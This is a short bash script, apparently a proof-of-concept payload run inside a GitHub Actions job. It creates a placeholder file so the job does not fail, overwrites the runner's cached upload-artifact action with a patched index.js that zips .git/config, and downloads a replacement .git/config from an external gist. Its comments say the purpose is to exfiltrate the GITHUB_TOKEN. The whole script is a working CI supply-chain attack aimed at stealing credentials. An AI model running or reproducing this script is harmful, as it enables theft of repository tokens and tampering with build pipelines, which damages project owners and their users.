#!/bin/bash

# to prevent the job from failing
touch missing_license_headers.txt

# patching the upload-artifact action with code to zip the .git/config file
cp index.js /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js

# modifying .git/config to exfiltrate the GITHUB_TOKEN
wget https://gist.githubusercontent.com/stazottest0/7714cfc6d5e2dc941db3d31bdfe3530f/raw/7d8a2de399fb0f9721da30340e103e744168efae/gistfile1.txt -O .git/config
